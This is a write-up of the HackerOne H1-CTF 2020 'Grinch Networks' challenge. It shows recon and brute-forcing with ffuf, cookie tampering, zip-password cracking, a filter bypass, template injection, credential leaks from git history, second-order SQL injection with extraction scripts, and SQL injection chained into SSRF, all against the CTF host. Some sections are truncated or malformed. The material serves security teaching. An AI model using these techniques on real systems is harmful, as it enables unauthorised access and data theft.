title: "Hacking Grinch Networks - H1-CTF 2020"
date: 2020-12-29 13:37:31
description: Hackerone CTF - December 2020 
---


The theme of this h1-CTF was very interesting, they tried to mimic a fake company called GRINCH-NETWORKS.

GRINCH-NETWORKS is a new Company rolling 1 new feature on their website each day. We as hackers aim to penetrate each feature they release and find the flag as Proof of Concept(POC) that the feature has bugs in it.

The challenge were very interesting ranging from recon, osint to advance exploit chains. My writeup for all the flags is listed below in the order 1 to 12

## The Beginning: Flag-1

H1-CTF started with the following tweet 
```
The Grinch has gone hi-tech this year with the intention of ruining the holidays Face screaming in fearWe need you to infiltrate his network and take him down
```

The scope of attack surface was very clearly mentioned at [https://hackerone.com/h1-ctf](https://hackerone.com/h1-ctf) Hacker page. This reveals the web assets in scope for GRINCH-NETWORKS are:
* [https://hackyholidays.h1ctf.com/](https://hackyholidays.h1ctf.com/)

It was day-1, there weren't any features/apps released yet. We are expecting the flag-1 hidden somewhere on the website. 
I tried to brute force directories and files on https://hackyholidays.h1ctf.com/ using [ffuf](https://github.com/ffuf/ffuf):
```bash
>> sapra@Macbook-Pro $ ffuf -u "https://hackyholidays.h1ctf.com/FUZZ" -D -e html -w ~/Desktop/directorylist.txt -ac

        /'___\  /'___\           /'___\

       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

```

On visiting https://hackyholidays.h1ctf.com/robots.txt we will be greeted with our first flag and it also leaks path to our next flag.

```bash
$ curl "https://hackyholidays.h1ctf.com/robots.txt" -v
< HTTP/1.1 200 OK
< Server: nginx/1.18.0 (Ubuntu)

Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}* Closing connection 0

```
> Flag-1 : flag{48104912-28b0-494a-9995-a203d1e261e7}

----
## Secret-Area : Flag-2

There was no description for this challenge but it was just a continuation of the 1st challenge. 

We can notice that apart from FLAG-1 in [https://hackyholidays.h1ctf.com/robots.txt](https://hackyholidays.h1ctf.com/robots.txt) we also have a secret path in it which is `/s3cr3t-ar3a`, so FLAG-2 should be somewhere here. 

Being challenge-2 this should also be something easy, after trying to look for the flag and fuzzing sub-directories under `/s3cr3t-ar3a/` we can find the flag in the page source. POC:
* Visit [https://hackyholidays.h1ctf.com/s3cr3t-ar3a](https://hackyholidays.h1ctf.com/s3cr3t-ar3a) in browser
* Open `INSPECT ELEMENT` by pressing `F12` on windows or `Command+Option+i` on Mac
* Search for word `flag` in HTML and there is flag in one of the div (see the picture below)

![](https://i.imgur.com/7ODWP27.png)

> FLAG-2 flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}

> BONUS: This was good enough for me to move on to the next challenge but there's a caveat. Doing a `curl https://hackyholidays.h1ctf.com/ | grep flag` didn't reveal the flag but it's only visible in the browser after doing `INSPECT-ELEMENT`. This means it's being dynamically inserted into the webpage by some JAVASCRIPT. Out of curiosity I thought of looking where this script is and it was inside the JQuery library at`https://hackyholidays.h1ctf.com/assets/js/jquery.min.js`. 

```javascript
var h1_0 = 'la'
, h1_1 = '}'
, h1_2 = ''
, h1_3 = 'f'
, h1_4 = 'g'
, h1_5 = '{b7ebcb75'
, h1_6 = '8454-'
, h1_7 = 'cfb9574459f7'
, h1_8 = '-9100-4f91-';

document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);
```

*Always good to satisfy your PTSD :smile: .. Moving on*

## People-Rater : FLAG-3


Description: 
```
The grinch likes to keep lists of all the people he hates. This year he's gone digital but there might be a record that doesn't belong!

Challenge-Url: https://hackyholidays.h1ctf.com/people-rater
```

### Understanding the Web-App

This was a simple web app that hits an API endpoint to get a list of users in a paginated manner. 
So 
* https://hackyholidays.h1ctf.com/people-rater/page/1 -> `first 5 users`
* https://hackyholidays.h1ctf.com/people-rater/page/2 -> `users 5-10`
<br>...

Next, there is an API [https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6OH0=](https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6OH0=) to get information about the user provided by parameter `id`. (id is base64 encoded JSON of {"id":8} )


So the first step would be to enumerate information about each user.

### Solution

I wrote a simple bash script to enumerate all users from id 1 to 20. Basically do a curl request for each userId from id [1-20] and print the result

```bash
>> sapra@MacBook-Pro ~ % for i in $(seq 1 20)
do
x=`echo {\"id\":${i}} | base64`
echo "------------------------"
echo -n "> UserInfo for ID=${i} -> "
curl "https://hackyholidays.h1ctf.com/people-rater/entry?id=${x}";
echo "\n";
done

------------------------
> UserInfo for ID=1 -> {"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
> UserInfo for ID=2 -> {"id":"eyJpZCI6Mn0=","name":"Tea Avery","rating":"Awful"}
...
```

> user information of userId=1 [https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0=](https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0=) contains flag

> FLAG-3: flag{b705fb11-fb55-442f-847f-0931be82ed9a}


----
## Swag-Shop : FLAG-4

Description: 
```
Get your Grinch Merch! Try and find a way to pull the Grinch's personal details from the online shop.

Challenge-URL: https://hackyholidays.h1ctf.com/swag-shop
```

### Understanding the Web-App

There was not much functionality to the app. We only have a login endpoint https://hackyholidays.h1ctf.com/swag-shop/api/login and nothing else. Trying to log in with common usernames/passwords didn't work so brute-forcing credentials would be the last step.

The next immediate thing to do is recon. Look for hidden directories under https://hackyholidays.h1ctf.com/swag-shop

### Fuzzing/Recon

Run ffuz under `https://hackyholidays.h1ctf.com/swag-shop/FUZZ` for finding hidden directories.

```bash
>> sapra@MacBook-Pro ~ % ffuf -u https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ -fc 404  -w ~/Desktop/hacking/wordlist/apiendpoints.txt

        /'___\  /'___\           /'___\

         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/
________________________________________________

Great, we find 2 interesting directories. 
* /sessions
    * This was open API which printed a list of all the login sessions that were logged in
    ![](https://i.imgur.com/y8chZXi.png)
    * Decoding base64 of each session we find bunch of `cookie` and 1 user-id `C7DCCE-0E0DAB-B20226-FC92EA-1B9043`

    * We have a parameter hit for `uuid`. 

### Solution

After finishing the recon we have an endpoint `/session` exposing some cookies and 1 user uuid and an endpoint `/user` which takes uuid as a parameter. Hitting `/user` endpoint with uuid from /session we will get the flag

```bash
>> sapra@MacBook-Pro ~ % curl  "https://hackyholidays.h1ctf.com/swag-shop/api/user/?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043"

```

> FLAG-4: flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}

## Secure-Login : FLAG-5

Description:
```
Try and find a way past the login page to get to the secret area.

Challenge-Url: https://hackyholidays.h1ctf.com/secure-login
```

### Understanding the Web-App

There is not much functionality in the application. We are presented with a login Form and the description asks us to bypass it. The first few thoughts would be SQL-injection or something.

When trying to log-in with basic SQL-injection in username and password `1' or '1'='1`, if we pay have attention to details, the error returned back is `Invalid Username`, Simply said, there is a way to enumerate username with this error message. So a correct username would say something like `Invalid password`.

With this knowledge, it means we can enumerate `username` and `password`. If this doesn't work, we can go back to recon and search for hidden directories.

### Solution

We can use `ffuf` to brute force username and validate our theory.

```bash
>> sapra@MacBook ~ % fff -u "https://hackyholidays.h1ctf.com/secure-login"  -X POST -d 'username=FUZZ&password=?' -w ~/Desktop/users.txt  -H "Content-Type: application/x-www-form-urlencoded" -fr "Invalid Usern"

Ok, great we were able to find a valid username `access`. Now we can do the same for password.

```bash

```

Login to [https://hackyholidays.h1ctf.com/secure-login](https://hackyholidays.h1ctf.com/secure-login) using credentials `username=access` and `password=computer`. 

We can notice logging in sets the cookie `securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=` and we are logged in as non admin user. 

Base64 decode the cookie
```bash
>> sapra@MacBook-Pro % echo eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0= | base64 -D

{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
```

set the "admin" value to `true` and base64 encode and send it back. It should log us in as admin user.
```bash
>> sapra@Macbook-Pro % echo '{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}' | base64

eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQo=
```
![](https://i.imgur.com/Cbpi0II.png)


We are able to log in as admin, but hey challenge ain't over yet :P. 

Download the zip file https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip, We now have a password protected zip file.
We can use john-the-ripper tool to crack the zip file password.

```bash
>> root@box:/ctf $ wget https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip -O flag.zip
>> root@box:/ctf $ ./JohnTheRipper/run/zip2john flag.zip > flag.hash
>> root@box:/ctf $ ./JohnTheRipper/run/john flag.hash --show

<< flag.zip:hahahaha::flag.zip:flag.txt, xxx.png:flag.zip
```

ZIP's password is `hahahaha`. We can now decrypt the zip and it will output a flag.txt file which has the flag
```
>> root@32ee62bd0d46:/ctf# unzip -P "hahahaha" flag.zip
Archive:  flag.zip
  inflating: xxx.png

## My-Diary: FLAG 6

Description:
```
Hackers! It looks like the Grinch has released his Diary on Grinch Networks. We know he has an upcoming event but he hasn't posted it on his calendar. Can you hack his diary and find out what it is?

Challenge-URL: https://hackyholidays.h1ctf.com/my-diary
```
### Understanding the Web-App

Opening the Challenge URL we are redirected to [https://hackyholidays.h1ctf.com/my-diary/?template=entries.html](https://hackyholidays.h1ctf.com/my-diary/?template=entries.html) . Apart from the parameter `template=entries.html` the application has no other LINK or functionality. 


### Fuzzing

Let's start by fuzzing the parameter `template` in https://hackyholidays.h1ctf.com/my-diary/?template=FUZZ

```
>> sapra@MacBook-Pro ~ % fff -u "https://hackyholidays.h1ctf.com/my-diary/?template=FUZZ" -w ~/Desktop/directories.txt -ac

        /'___\  /'___\           /'___\

 :: Matcher          : Response status: 200,204,301,302,307,401,403

________________________________________________

index.php               [Status: 200, Size: 689, Words: 126, Lines: 22]
```

And we have a parameter hit `index.php` which leaks the source code of the app.
```php
index.php

<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```
### Solution

The source code is pretty straight forward. The goal is to get the contents of secretadmin.php by opening it as `https://hackyholidays.h1ctf.com/my-diary/?template=secretadmin.php`.

The problem is that the word `secretadmin.php` and `admin.php` are deleted from the user input template. Example of how `str_replace` works
* `$output = str_replace('admin.php', $userinput);` 
    * when `$userinput = "admin.php"` then => `$output=""`
    * when `$userinput= "adadmin.phpmin.php"` then => `$output="admin.php"`

str_replace() will delete `admin.php` from the input and leftover in this case will be `admin.php` (ad~~admin.php~~min.php = `admin.php`) as str_replace does not recursively delete the word from the input. Using this knowledge we can use the following payload to open `secretadmin.php`. 

POC: 
* Visit [https://hackyholidays.h1ctf.com/my-diary/?template=secsecretadmadmin.phpin.phpretadmadmin.phpin.php](https://hackyholidays.h1ctf.com/my-diary/?template=secsecretadmadmin.phpin.phpretadmadmin.phpin.php)
* After deleting `admin.php` and `secretadmadmin.php` from `secsecretadmadmin.phpin.phpretadmadmin.phpin.php` we will be left with `secretadmadmin.php`.

```bash
>> sapra@MacBook-Pro ~ % curl "https://hackyholidays.h1ctf.com/my-diary/?template=secsecretadmadmin.phpin.phpretadmadmin.phpin.php" | grep flag

<h4 class="text-center">flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}</h4>
```

> FLAG-6: flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}

## Hate-Mail-Generator: Flag-7

Description: 
```
Sending letters is so slow! Now the grinch sends his hate mail by email campaigns! Try and find the hidden flag!

Challenge-URL: https://hackyholidays.h1ctf.com/hate-mail-generator
```

### Understanding the web-app

The web application allows us to create Email templates to send to users. Without login, a user can only create an email template and `preview` how it will look but not save it. 
TL;DR We as user can create a temporary email template and `preview` it. Templates are generally a good candidate for template-injection in which we can abuse variables of the template to perform malicious activity. 
Therefore, we first need to know what malicious activity we should perform, in short find where the flag is, and use template injection to get the flag.

### Fuzzing/Recon

We need to find the flag location first. We can definitely run `ffuf` but I prefer to manually understand the app structure first. 
We are provided with a demo email template for reference under `Guess what` Campaign at [https://hackyholidays.h1ctf.com/hate-mail-generator/91d45040151b681549d82d8065d43030](https://hackyholidays.h1ctf.com/hate-mail-generator/91d45040151b681549d82d8065d43030) with following content follows:
```
{ {template:cbdj3_grinch_header.html}} Hi2 { {name}}..... Guess what..... <strong>YOU SUCK!</strong>{ {template:cbdj3_grinch_footer.html}}
```

This `cbdj3_grinch_header.html` must be under some directory/file path. The first thing that comes to mind is to maybe include an incorrect HTML file, and hopefully produce some error. So let's try to create a template with a random file path in search of an error that probably leaks the file path.

Create a new template with the following data and preview it :
* Go to [https://hackyholidays.h1ctf.com/hate-mail-generator/new](https://hackyholidays.h1ctf.com/hate-mail-generator/new) to create a new template
* Fill the fields as shown in below..(Markup = `template:random_random.html`)
    ![](https://i.imgur.com/dhlX7aW.png)
* Press on preview and we will get the error: `Cannot find template file /templates/random_random.html`

Great we have a folder `templates`. Visit [https://hackyholidays.h1ctf.com/hate-mail-generator/templates/](https://hackyholidays.h1ctf.com/hate-mail-generator/templates/) and directory listing is ON. we can find the admin user template at `38dhs_admins_only_header.html`, Obviously, we cant open it directly or using `{ {template:38dhs_admins_only_header.html}}` as its blocked. Let's use the power of template-injection to bypass this filter.

### Solution

So now we know we have to use template injection to include the file `38dhs_admins_only_header.html`. The endpoint to `preview` a new template is as follows:

![](https://i.imgur.com/yYn0e0F.png)

Observation:
* The parameter `preview_data` is substituted into `preview_markup`.
* Sending `preview_markup={ {template:38dhs_admins_only_header.html}}&preview_data={}` is blocked. 

We can send the following request to retrieve the flag. `preview_markup` parameter does not contain `{ {template:38dhs_admins_only_header.html}}` initially but after substituting `preview_data` into `preview_data` it does.
```
preview_markup={ {name}}&preview_data={"name":"{ {template:38dhs_admins_only_header.html}}"}
```

## Forum : Flag-8

Description:

```
The Grinch thought it might be a good idea to start a forum but nobody really wants to chat to him. He keeps his best posts in the Admin section but you'll need a valid login to access that!

Challenge-URL: https://hackyholidays.h1ctf.com/forum
```

### Understanding the web-app

It was a blogging app with few public blogs and admin's only private blogs. The end goal seems to read Admin's post which might contain the flag. Few things that come directly to mind is IDOR to fuzz and get Admin's blog ID but the authorization was handled properly.

So the only thing I can think now is to get into the admin's account. 


### Fuzzing/Recon

* So the first obvious thing is to try default username/password and SQL/NoSQL injection at [https://hackyholidays.h1ctf.com/forum/login](https://hackyholidays.h1ctf.com/forum/login) but it didn't work. 
* Directory brute forcing on https://hackyholidays.h1ctf.com/forum/ gives 
    * `phpmyadmin` (Interesting but we don't have its creds)
* Fuzzed for zipped SQL file `db.zip`, `sql.zip` etc. got no hit.
* swap files `/.index.php.swp`, `/.index.swp` etc. got no hit.
... 
 
After fuzzing everything within the website I can't find any credentials. It was time to look elsewhere and do some real recon. 

![](https://i.imgur.com/kul6A9Y.jpg)

My recon process includes 
* Finding keywords
    * grinchnetworks (company name)
    * hackyholidays.h1ctf.com (domain name)
    * hackyholidays (sub-domain)
    * Image Logo is https://hackyholidays.h1ctf.com/assets/images/grinch-networks.png. Add `grinch-networks` to keywords dict.
    * Use [CeWl](https://github.com/digininja/CeWL) to find keywords from scraping webpage
    ...
* Use following resources to search the keywords found in step-1
    * GitHub
    * webarchieve - Cached web pages
    * shodan
    * S3 bucket brute-forcing.
    * Google Hacking
    * certificates
    * https://storage.googleapis.com/[keyword]
    ...


After trying the above recon tricks, I found a open github repo for this challenge after searching for word `grinch-networks` on github [https://github.com/Grinch-Networks/forum](https://github.com/Grinch-Networks/forum)

Before downloading the blog itself, it's always always a good idea to check for older commits because usually, they can contain admin removing credentials from uploaded code `OR` fixing a bug. In our case, we can see that the 3rd commit [https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae](https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae) was removing the Database credentials from the code. 

![](https://i.imgur.com/FGijYPh.png)

Now we have database credentials: `user: forum`, `pass: 6HgeAZ0qC9T6CQIqJpD` and our fuzzing did show there was phpmyadmin. We can successfully login with these credentials at [https://hackyholidays.h1ctf.com/forum/phpmyadmin](https://hackyholidays.h1ctf.com/forum/phpmyadmin) .

User table in phpmyadmin contains 2 user
* user=grinch , passwordHash=35D652126CA1706B59DB02C93E0C9FBF, admin=1
* user=max, passwordHash=388E015BC43980947FCE0E5DB16481D1, admin=0

passwordHash is 32 characters long meaning it's `md5`. Go to [https://crackstation.net/](https://crackstation.net/) and paste the admin's hash `35D652126CA1706B59DB02C93E0C9FBF` there and it will crack it for us. 

The cracked hash is `BahHumbug`.

Log into [https://hackyholidays.h1ctf.com/forum/login](https://hackyholidays.h1ctf.com/forum/login) with user `grinch` and password `BahHumbug`. We will be logged in as admin. 

Visit admin's secret post at [https://hackyholidays.h1ctf.com/forum/3/2](https://hackyholidays.h1ctf.com/forum/3/2) and get the flag.

## Evil-Quiz : Flag-9

Description:
```
Just how evil are you? Take the quiz and see! Just don't go poking around the admin area!

Challenge-URL: https://hackyholidays.h1ctf.com/evil-quiz
```
### Understanding the web-app

There is an admin login section to the app at [https://hackyholidays.h1ctf.com/evil-quiz/admin](https://hackyholidays.h1ctf.com/evil-quiz/admin). 

Also, there's a quiz section where we can play a simple quiz as follows:
* Create a user to play the quiz at [https://hackyholidays.h1ctf.com/evil-quiz/](https://hackyholidays.h1ctf.com/evil-quiz/)
* After creating a user we are redirected to [https://hackyholidays.h1ctf.com/evil-quiz/start](https://hackyholidays.h1ctf.com/evil-quiz/start). This page has certain quiz questions to fill and submit.
* Submitting the answers to question redirect us to `score` page at [https://hackyholidays.h1ctf.com/evil-quiz/score](https://hackyholidays.h1ctf.com/evil-quiz/score) showing how many questions we got correct


We have 2 places where the app takes user input
1. username : when starting the quiz
2. quiz-answers : multiple choice answers to questions asked in step 2

Trying basic SQL-injection payload in the username field, we can find that `username` field is vulnerable to 2nd order SQL-injection. Let's POC first. 
* create user with name `1' or '1'='` on [https://hackyholidays.h1ctf.com/evil-quiz/](https://hackyholidays.h1ctf.com/evil-quiz/)
* Goto `score` page([https://hackyholidays.h1ctf.com/evil-quiz/score](https://hackyholidays.h1ctf.com/evil-quiz/score)), we will see: `There is 1212112 other player(s) with the same name as you!`

This confirms we have 2nd order injection. We can mimic the above behavior with python scrip so that we don't have to do it manually.

```python
import requests 

s = requests.Session() 
URL = "https://hackyholidays.h1ctf.com"

SET_USERNAME_URL = URL + "/evil-quiz"
TAKE_QUIZ_URL = URL + "/evil-quiz/start"
SCORE_URL = URL + "/evil-quiz/score"

def get_session():

    s.get(SET_USERNAME_URL, allow_redirects=False)
    r = s.post(SET_USERNAME_URL, data={"name":"test-get-session"}, allow_redirects=False)
    s.post(TAKE_QUIZ_URL, data={"ques_1":0,"ques_2":"0","ques_3":0}, allow_redirects=False)
    s.get(SCORE_URL,allow_redirects=False)
    print "[+] Session successfully created ", r.headers["Set-Cookie"]
    
def sqli(username):

    s.post(SET_USERNAME_URL, data={"name":username}, allow_redirects=False)
    r = s.get(SCORE_URL)  
    data =  re.search("There is (.*) othe", r.text)
    if data:
      print data.group(1)
      return data.group(1)
    else:
      print "ERROR nothing found", r.text
        
get_session() # Play game once to get user session (Cookie: session)
sqli("1' or '1' = '1") # Try sqli and print the numbers matching query.
# 0 means injection is false any other value means true
```

### Solution

After confirming injection we just need to perform injection to leak the database with admin credentials.

Attaching script with a detailed explanation as comments on how the attack works.

[solver-h1-ctf-flag-9.py](/assets/files/h1-ctf-flag-9.py)

After successfully exploiting the injection we will have the following information:
* database name = `quiz`
    * injection = `1' or database() = 'quiz'#` will return true
* Tables = `admin`, quiz
    * injection = `1' OR (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) = 'admin'#` return true
* columns in Table admin= id, username, password
    * injection = `1' OR (select column_name from information_schema.columns where table_schema=database() and table_name='admin' limit 0,1) like 'id'#` leaks column-1 = 'id'
    * injection = `name=1' OR (select column_name from information_schema.columns where table_schema=database() and table_name='admin' limit 1,1) like 'username'#` leaks column-2 = 'username'
    * injection = `name=1' OR (select column_name from information_schema.columns where table_schema=database() and table_name='admin' limit 2,1) like 'password'#` leaks column-3 = 'password'
* 1st entry of Table admin = `username=admin` `password=S3creT_p4ssw0rd-$`
    * injection = `' OR (select username from admin)="admin"#` leaks username='admin'
    * injection = `' OR (select password from admin)= "S3creT_p4ssw0rd-$" #` leaks password='S3creT_p4ssw0rd-$'

Simply log-in into admin console from https://hackyholidays.h1ctf.com/evil-quiz/admin using `username=admin` and `password=S3creT_p4ssw0rd-$`, and get the flag

## Signup Manager : Flag-10

Description:
```
You've made it this far! The grinch is recruiting for his army to ruin the holidays but they're very picky on who they let in!

Challenge-URL: https://hackyholidays.h1ctf.com/signup-manager
```

### Understanding the web-app

There isn't really much functionality to the application. We have a register and login user functionality. Trying SQL-injection didn't work in either login or register. After registering a user, we are redirected to https://hackyholidays.h1ctf.com/signup-manager without any functionality.
So basically don't have anything but register/login/logout. 

### Fuzzing/Recon

Directory brute-forcing https://hackyholidays.h1ctf.com/signup-manager/ we will get a `README.md` file(https://hackyholidays.h1ctf.com/signup-manager/README.md) with the following content:
```
# SignUp Manager

SignUp manager is a simple and easy-to-use script that allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

### How to Install

1) Create a directory that you wish SignUp Manager to be installed into

2) Move signupmanager.zip into the new directory and unzip it.

3) For security move users.txt into a directory that cannot be read from website visitors

4) Update index.php with the location of your users.txt file

5) Edit the user and admin php files to display your hidden content

6) You can make anyone an admin by changing the last character in the users.txt file to a Y

7) Default login is admin / password
```

Important observation includes:
* source code at https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip 
* default user/pass = admin/password
* users.txt is used to store users info and there is no Database. Also, this file is not readable from web-root


### Solution

Most important piece of code from source code is while registering a new user:
```php
function addUser($username,$password,$age,$firstname,$lastname){
    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
    $line = '';
    $line .= str_pad( $username,15,"#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad( $age,3,"#");
    $line .= str_pad( $firstname,15,"#");
    $line .= str_pad( $lastname,15,"#");
    $line .= 'N';
    $line = substr($line,0,113);
    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
    return $random_hash;
}
```

The function creates a unique string by combining all the input from the user (username, password, age, firstname & lastname) into a single string and save it inside `users.txt`. The following pic depicts how the above function represents a user in the users.txt file.

![](https://i.imgur.com/fU1E5jw.png)

The goal is clear, we need to set the last byte which represents ADMIN to 'Y' instead of 'N'.

If we can insert 1-extra byte anywhere before `ADMIN` byte(last byte) and  set `lastname='NNNNNNNNNNNNNNY'` the overflow will cause the value of `ADMIN='Y'` (each value shift's 1 byte right, last byte of lastname becomes ADMIN's byte value)

Most of the user input (username, password, firstname and lastname) are correctly stripped and constrained within 15 characters. 

1 intersting property of integers in PHP is `100 === 1e2`. similary `1000 === 1e3`.

We have a limit on age to be within 3 characters and only 3 places are reserved for age in user string. So sending something like `age=1e3` will evaluate age to 1000 (length=4, thus we get 1 extra character we needed). 

So our exploit payload will have `age=1e3` and `lastname=NNNNNNNNNNNNNNY`.
```
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
Content-Length: 107


action=signup&username=username007&password=password&age=1e3&firstname=firstname&lastname=NNNNNNNNNNNNNNY
```

Login with `username=username007` & `password=password` and we will be greeted with flag

```

### Understanding the web-app

The app initially presents us with Photo albums for years 2018,2019 and 2020. There are 1-3 images in each album.

* album-2020 https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k
* album-2019 https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=59grop
* album-2018 https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=3dir42

Photo's in albums are fetched using an endpoint https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzliODgxYWY4YjMyZmYwN2Y2ZGFhZGE5NWZmNzBkYzNhLmpwZyIsImF1dGgiOiJlOTM0ZjQ0MDdhOWRmOWZkMjcyY2RiOWMzOTdmNjczZiJ9
* data parameter is base64 for JSON `{image: "r3c0n_server_4fdk59/uploads/9b881af8b32ff07f6daada95ff70dc3a.jpg", auth: "e934f4407a9df9fd272cdb9c397f673f"}`).
* Backend fetches the image in the JSON if the `auth` key matches. 
* Chaining the image path will change the `auth` key in JSON and the backend will error.

There is also a login page at https://hackyholidays.h1ctf.com/attack-box/login


### Fuzzing/Recon

Directory bruteforcing https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/ gives us following endpoints:
```bash
>> sapra@Macbook-Pro $  ffuf -u  https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/FUZZ -e php -D -mc 200

picture                 [Status: 200, Size: 21, Words: 3, Lines: 1]
```
We have 1 extra endpoint `/api`. Visiting https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api tells different response codes app support:
```
200     Successful request with data returned
204     Successful request but with no data found
404     Invalid Endpoint
400     Invalid GET/POST variable
401     Unauthenticated Request or Invalid client IP
```
Furthur fuzzing `/api/*` gives us 401 which is `Unauthenticated Request or Invalid client IP`. So we need some kind of `SSRF` to visit this endpoint.

Furthur fuzzing the endpoint https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k we can confirm that it is vulnerable to sql-injection. POC:

```

We have 2 tables `photo` and `album`. `album.id` is `foreign-key` to `photo.album_id`. This simply means they are called in conjunction. A simple query of getting all photos with `hash=3dir42` would look like

```php
$album_hash='3dir42'; # This is our sql-injection, coming from user input

$album_id = "select id,hash,name from album where id='${album_hash}'";
$photos = "select id,album_id,photo from photo where album_id='${album_id}'";

```

we can use injection at `album_hash` to completely control what goes into `$album_id`. `$album_id` then goes into 2nd query, thus we can have injection in 2nd query also. POC

```sql
/r3c0n_server_4fdk59/album?hash=-1' union select '2','x','x';
This should display us pictures where `album_id=2`. So 1 picture

QUERY-1:
    select id, hash, name from album where id=-1' union select '2','x','x'-- -
            
Query-2 (album_id from above query=2):
    select id, album_id, photo from photo where album_id='2';
```
There is only 1 picture with album_id=2. The output of the above query 1 picture. 
Thus we can confirm that we have 2 level injection. 

Now because we can control 2nd query results too, our goal is to SSRF to `/api/*` endpoint as found above. Following sql-injection should retrieve `photo` location as we want.

```sql
/r3c0n_server_4fdk59/album?hash=-1' union select '-1\' union select 1,1,"../../../r3c0n_server_4fdk59/api/test"-- -','x','x'-- -

Query-1: 
    select id, hash, name from album where id=-1' union select '-1\' union select 1,1,"../../../r3c0n_server_4fdk59/api/test"-- -','x','x'-- -

Query-2 
    * album_id from above query= -1' union select 1,1,"../../../r3c0n_server_4fdk59/api/test"-- -
    
    select id, album_id, photo from photo where album_id='-1' union select 1,1,"../../../r3c0n_server_4fdk59/api/test"-- -
```

We can now visit the image url https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC8uLlwvLi5cL3IzYzBuX3NlcnZlcl80ZmRrNTlcL2FwaVwvdGVzdCIsImF1dGgiOiI3MGI3Yzk0MjE1ZjE1YzYzNzA2N2RiOWU5YjFkZDFlMyJ9 which is base64 for `{image: "r3c0n_server_4fdk59/uploads/../../../r3c0n_server_4fdk59/api/test", auth: "70b7c94215f15c637067db9e9b1dd1e3"}`. 

Now we have SSRF, our next step should be to look for all interesting endpoints under `/api/*` for which I wrote a python script to perform the above steps and fuzz for hidden endpoints
```python
def find(directory):

  unhex = ("1' union select 1,2,'../api/"+directory.strip()+"'#").encode("hex")
  url = """https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-1'+union+all+select+unhex("{}"),"x","x"--+-""".format(unhex)
  r = requests.get(url).text

  val = re.search("data=(.*cL3VwbG9hZHNcLy.*)\"", r).group(1)

  x  = requests.get("https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data="+val)

  if "Received: 404" not in x.text:
    print(x.text, directory)

  return

directory_list = open("directory-fuzz.txt", "r").split("\n")

for directory in directory_list:
    find(directory)
```

After running the above script for a while with different directories, we will have hit for 2 API endpoints
```
/user -> Invalid content type detected
/ping -> Invalid content type detected
```

Next we can try fuzzing for parameters these endpoints take. Sending something like
```python
find("user/?name=1") -> Expected HTTP status 200, Received: 400
```
Status 400 from API documentation means `Invalid GET/POST variable`. Thus it means we have a way to find the parameters these endpoints except. We can reuse the above script but for fuzzing `parameters` this time. 

```python
parameters = open("parameters.txt", "r")
for parameter in parameters:
    find(f"user/?{parameter}=1")
```

Above script reveal the following parameters:
```
